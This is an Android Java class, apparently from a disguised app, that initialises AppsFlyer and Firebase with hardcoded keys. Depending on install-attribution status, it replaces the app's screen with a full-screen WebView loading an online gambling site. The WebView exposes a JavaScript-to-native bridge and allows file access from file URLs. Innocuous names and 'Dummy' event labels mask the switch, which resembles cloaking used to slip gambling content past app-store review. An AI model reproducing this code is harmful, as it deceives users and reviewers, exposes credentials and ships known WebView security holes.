package com.example.myapplication;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;

import androidx.core.content.FileProvider;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.internal.AFa1aSDK;
import com.google.firebase.FirebaseApp;
import com.google.zxing.client.android.BuildConfig;

import org.json.JSONObject;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Heave {

    public String eString = "";

    public String status = "Organic";

    public Activity context;

    private int REQUEST_GALLERY = 10001;
    private int REQUEST_CAMERA = 10002;
    private int REQUEST_FILE = 10003;
    private String mSavePath = "";

    /**
     * .class文件名中包含$ --> zzz$1.class
     * 这是因为在此类中有匿名类。 它们使用ClassName $ InnerClassName此命名约定进行编译。
     *
     * @param context
     * @return
     */
    public String initAF(Context context) {

        this.context = (Activity) context;
        Log.e("xxx", "initAF from C");

        FirebaseApp.initializeApp(context);

        try {
            AppsFlyerLib appsFlyerLib = AppsFlyerLib.getInstance();
            Log.e("xxx", "AppsFlyerLib.getInstance() 正确");
            appsFlyerLib.setDebugLog(true);

            Log.e("xxx", "aaa");
            appsFlyerLib.init("2o5ebrDVwrE8RqB8DAdNo7", new MyAFListener(this,context), context);
            appsFlyerLib.start(context);

            Log.e("xxx", "bbb");

            String appsflyer_id = appsFlyerLib.getAppsFlyerUID(context);

            HashMap<String, String> map = new HashMap<String, String>();
            map.put("appsflyer_id", appsflyer_id);
            map.put("token", "b801b903-4318-4bb0-9107-73efffdc7886");
            map.put("app_id", context.getPackageName());


            JSONObject jsonObject = new JSONObject(map);
            String afstr = jsonObject.toString();

            Log.e("xxx", afstr);

            eString = Base64.encodeToString(afstr.getBytes(StandardCharsets.UTF_8), Base64.DEFAULT);

            return eString;
        }catch (Exception e){
            e.printStackTrace();
            return "";
        }


    }

    public void toNext(String status,Context context) {
        Log.e("xxx2",status);

        if ("Non-Organic".equals(status)) {
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.setAction("android.intent.action.main");
            context.startActivity(intent);
            ((Activity)context).finish();
        } else {
            addWebview((Activity)context);
        }
    }

    FrameLayout layout = null;
    ImageView closeImage = null;
    WebView webView = null;

    private void addWebview(Activity context) {
        layout = (FrameLayout)context.getWindow().getDecorView().findViewById(android.R.id.content);

        layout.removeAllViews();
        webView = new WebView(context);
        FrameLayout.LayoutParams webViewParams = new FrameLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
        );
        webView.setLayoutParams(webViewParams);
        layout.addView(webView);

        RelativeLayout toolbar = new RelativeLayout(context);
        FrameLayout.LayoutParams layoutParams2 = new FrameLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 80);
        toolbar.setLayoutParams(layoutParams2);
        toolbar.setPadding(30, 20, 0, 0);

        closeImage = new ImageView(context);
        closeImage.setImageResource(android.R.drawable.ic_menu_close_clear_cancel);
        closeImage.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                context.finish();
            }
        });
        closeImage.setVisibility(View.GONE);

        toolbar.setGravity(Gravity.CENTER_VERTICAL & Gravity.START);
        toolbar.addView(closeImage);
        layout.addView(toolbar);
        initWebView(context);

        boolean showClose = context.getIntent().getBooleanExtra("showClose", false);
        showClose(showClose);
    }

    private ValueCallback<Uri[]> mFilePathCallback = null;
    private WebChromeClient.FileChooserParams mFileChooserParams = null;


    private Uri sourceUri = null;

    public void initWebView(Activity context) {
        String adId = "https://www.winclub.net?code=1199";

        webView.addJavascriptInterface(new JH(context),"GameToNative");

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        settings.setCacheMode(WebSettings.LOAD_NO_CACHE);
        settings.setJavaScriptCanOpenWindowsAutomatically(true);
        settings.setAllowFileAccess(true);
        settings.setUserAgentString(settings.getUserAgentString() + "AndSkyWeb&packageName=" + BuildConfig.APPLICATION_ID);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            settings.setAllowFileAccessFromFileURLs(true);
        }
        sourceUri = Uri.parse(adId);
        webView.setWebChromeClient(new WebChromeClient() {

            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
                mFilePathCallback = filePathCallback;
                mFileChooserParams = fileChooserParams;
                showChoseAlertDialog(fileChooserParams);
                return true;
            }
        });

        webView.setWebViewClient(new WebViewClient() {

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                Log.e("xxx","onPageStarted");
                LogManager.logEvent("Dummy_Trigger_Update", context);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                Log.e("xxx","onPageFinished");
                LogManager.logEvent("Dummy_Update_Success", context);
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {

                if (!request.getUrl().toString().contains(sourceUri.getHost().replace("www", ""))) {

                    Intent intent = new Intent(context, context.getClass());

                    intent.putExtra("data", request.getUrl().toString());
                    intent.putExtra("showClose", true);

                    context.startActivity(intent);
                    return true;
                } else {
                    return false;
                }
            }
        });

        Log.e("xxx",adId);
        webView.loadUrl(adId);

    }

    private void showChoseAlertDialog(WebChromeClient.FileChooserParams fileChooserParams) {
        boolean isCancelOutSide = true;
        int channelNum = 30;

        AlertDialog dialog =  new AlertDialog.Builder(context).setItems(getSelectorText(30), new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                switch (i) {
                    case 0:
                        dialogInterface.dismiss();
                        choseAlbum(fileChooserParams);

                        break;
                    case 1:
                        dialogInterface.dismiss();
                        takePhoto();
                        break;

                    case 2:
                        dialogInterface.dismiss();
                        showFileChooser(fileChooserParams);
                        break;
                }
            }
        }).show();

        dialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
            @Override
            public void onCancel(DialogInterface dialogInterface) {
                mFilePathCallback.onReceiveValue(null);
            }
        });
    }

    private void choseAlbum(WebChromeClient.FileChooserParams fileChooserParams) {

        Intent intent = new Intent(Intent.ACTION_PICK);

        intent.setDataAndType(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/*");
        context.startActivityForResult(Intent.createChooser(intent, "Image Chooser"), REQUEST_GALLERY);
    }


    Uri mCameraUri = null;

    private void takePhoto() {

        File file = new File(context.getExternalCacheDir(), "images/" + System.currentTimeMillis() + ".jpg");


        if (!file.getParentFile().exists()) {
            file.getParentFile().mkdirs();
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            mCameraUri = FileProvider.getUriForFile(context, BuildConfig.APPLICATION_ID + ".fileProvider", file);
        } else {
            mCameraUri = Uri.fromFile(file);
        }
        Intent intent = new Intent();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        }
        intent.setAction(MediaStore.ACTION_IMAGE_CAPTURE);
        intent.putExtra(MediaStore.EXTRA_OUTPUT, mCameraUri);
        context.startActivityForResult(intent, REQUEST_CAMERA);

    }


    private void showFileChooser(WebChromeClient.FileChooserParams fileChooserParams) {

        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);

        intent.addCategory(Intent.CATEGORY_OPENABLE);
        intent.setType("*/*");
        context.startActivityForResult(Intent.createChooser(intent, "Image Chooser"), REQUEST_GALLERY);
    }

    private String[] getSelectorText(int id) {
        switch (id) {
            case 28:
            case 29:
                return new String[]{"Foto", "Kamera", "Folder"};
            case 30:
            case 33:
            case 330000:
            case 38:
                return new String[]{"Hình chụp", "Máy ảnh", "Tài liệu"};
            case 32:
                return new String[]{"Foto", "Câmera", "Arquivo"};
            default:
                return new String[]{"Photo", "Camera", "File"};
        }
    }

    private void showClose(boolean showClose) {
        if (showClose) {
            closeImage.setVisibility(View.VISIBLE);
        } else {
            closeImage.setVisibility(View.GONE);
        }
    }

    public String hello(String str) {
        Log.e("xxx", "hello from Heave");
        return "hello " + str;
    }

}

